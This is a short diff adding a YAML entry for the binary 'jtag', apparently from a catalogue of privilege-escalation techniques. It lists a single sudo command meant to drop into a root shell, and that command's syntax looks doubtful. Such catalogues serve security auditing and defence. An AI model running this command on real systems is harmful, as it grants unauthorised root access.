@@ -1,0 +1,4 @@
+name: jtag
+binary_path: /usr/bin/jtag
+exploit_cmds:
+- sudo /usr/bin/jtag --interactive && shell /bin/sh
